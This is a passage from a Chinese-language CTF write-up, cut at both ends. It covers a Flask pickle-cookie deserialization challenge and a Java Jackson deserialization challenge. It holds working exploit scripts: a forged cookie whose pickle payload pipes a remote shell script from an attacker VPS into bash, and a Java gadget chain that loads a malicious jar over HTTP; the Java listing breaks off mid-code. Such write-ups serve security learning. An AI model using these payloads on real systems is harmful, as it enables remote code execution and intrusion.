set_cookie(<span class="string">&quot;user&quot;</span>, res, secret=secret_code)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/board&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">board</span>():</span><br><span class="line">    invalid = cookie_check(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> invalid:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope, invalid code get out!&quot;</span></span><br><span class="line">    data = get_cookie(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data)</span><br><span class="line">        data = <span class="built_in">str</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据源码import的包名, 把他们也读出来</p><p>cookie.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response, request</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line">basestring = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quoted from python bottle template, thanks :D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> data:</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = request.cookies.get(key)</span><br><span class="line">    data = tob(request.cookies.get(key))</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = request.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x == y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">name, value, secret=<span class="literal">None</span>, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        value = touni(cookie_encode((name, value), secret))</span><br><span class="line">        resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;user&quot;</span>, value, max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Cookie value to long.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config&#x2F;secret_key.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br></pre></td></tr></table></figure><p>分析一下, 是一个简单的pickle反序列化, cookie处存在反序列化点, 这里没法直接弹shell, 所以在vps上起一个http服务放python的反弹shell, 然后curl下来推到bash即可</p><p>稍微改一下, 写一个伪造cookie的脚本</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, touni, cookie_encode, cookie_decode, tob, cookie_is_encoded, _lscmp</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">cookie,key=<span class="string">&#x27;user&#x27;</span>, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = cookie</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl http://107.148.75.202:8000/pyshell.sh | bash&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    code = opcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    res = code</span><br><span class="line">    cookie = touni(cookie_encode((<span class="string">&#x27;user&#x27;</span>, res), secret_code))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    <span class="comment"># dec = cookie_decode(cookie, secret_code)</span></span><br><span class="line">    <span class="comment"># print(dec)</span></span><br><span class="line">    data_cookie = get_cookie(cookie, secret=secret_code)</span><br><span class="line"></span><br><span class="line">    data = tob(cookie)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret_code), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data_cookie, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data_cookie)</span><br></pre></td></tr></table></figure><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>拿到jar包, 首先拿到账号密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828125100773.png" alt="image-20240828125100773"></p><p>在UserController存在反序列化和文件上传, 有了账户密码才能访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: ycbjava-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/ycbjava/controler/UserControler.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserControler</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/user/index&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/ser&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ser</span><span class="params">(<span class="meta">@RequestParam(&quot;ser&quot;)</span> String ser)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(ser);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(decode);</span><br><span class="line">        <span class="type">MyObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/upload&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;../&quot;</span>) || fileName.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> fileName.substring(index);</span><br><span class="line">            <span class="keyword">if</span> (suffix.equals(<span class="string">&quot;.jsp&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/templates/&quot;</span> + fileName, <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">            Files.write(path, bytes, <span class="keyword">new</span> <span class="title class_">OpenOption</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下有shiro的依赖, 先是打了cb链, shiro反序列化,  无果</p><p>过滤了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="string">&quot;java.security.SignedObject&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <span class="string">&quot;org.apache.commons.beanutils&quot;</span>, <span class="string">&quot;org.apache.commons.collections&quot;</span>, <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试了utf-8 overlang bypass也不行</p><p>看来它禁掉的类是用不了了</p><p>在<code>com.example.ycbjava.bean.User#getGift</code>方法中向urlclasspath中添加数据, 结合之前的文件上传, 思路一下就有了:</p><blockquote><p>首先上传一个jar包, 然后触发getGift把&#x2F;templates&#x2F;下的jar包导入<code>urlclasspath</code>, 再次反序列化就能加载原本不存在的类</p></blockquote><p>getGift明显是一个getter, 但是禁的太多了, cb什么的都不能用, 没办法调用任意getter</p><p>思来想去我把目光放在了jackson上, 这里jackson版本2.13.5, 比较高, 之前没接触过jackson反序列化, 本来以为这是没什么链能用</p><p>抱着学习的态度看了下jackson反序列化, </p><p><code>POJONode</code>这个类的toString(父类实现)可以遍历调用getter, 那么问题就转化到调用toString了</p><p>唯一熟悉的<code>javax.management.BadAttributeValueExpException</code>调用toString被禁</p><p>找了很久直到看见这篇:</p><p><a href="https://www.aiwin.fun/index.php/archives/4420/">https://www.aiwin.fun/index.php/archives/4420/</a></p><p>搬过来直接用</p><p>插入urlclassspath的地方有一个小小的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828130407747.png" alt="image-20240828130407747"></p><p>在http或file前面加上jar:即可绕过</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:file:/D:/tmp/123.jar!/</span><br></pre></td></tr></table></figure><p>末尾的<code>!/</code>是必不可少的</p><p>但是这题最坑的地方在于, 上传的jar包根本用不了(或许我的姿势不对), 所以我们使用<code>jar:http://</code>远程加载类</p><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.Test.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksonHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        CtClass ctClass= ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        CtMethod writeReplace=ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;jar:http://107.148.75.202:8000/123.jar!/&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(evil);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; innerClass=Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);</span><br><span class="line">        Map map1= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map2= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map3= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map4= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        map3.put(pojoNode2,<span class="string">&quot;222&quot;</span>);</span><br><span class="line">        map4.put(pojoNode2,<span class="string">&quot;111&quot;</span>);<span class="comment">//pojoNode2中是原本不存在的恶意类, 先将pojoNode2放进去,保证执行了getGift再执行恶意类的toString方法, 否则加载不到恶意类</span></span><br><span class="line">        map1.put(pojoNode,<span class="string">&quot;444&quot;</span>);</span><br><span class="line">        